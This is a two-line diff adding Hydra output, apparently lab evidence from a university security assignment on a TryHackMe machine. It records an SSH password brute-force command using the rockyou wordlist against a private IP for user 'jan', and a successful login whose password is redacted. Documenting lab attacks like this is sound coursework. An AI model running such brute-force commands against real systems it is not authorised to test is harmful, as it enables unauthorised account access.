@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-10-07 01:15:15 on 10.65.164.0 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f -o /mnt/c/Facultad/Seguridad/tp-thm/evidencias/explotacion/hydra_jan.txt ssh://10.65.164.0)
+[22][ssh] host: 10.65.164.0   login: jan   cred_jan -> [REDACTADA, ver hash SHA-256 en credenciales_hashes.txt]
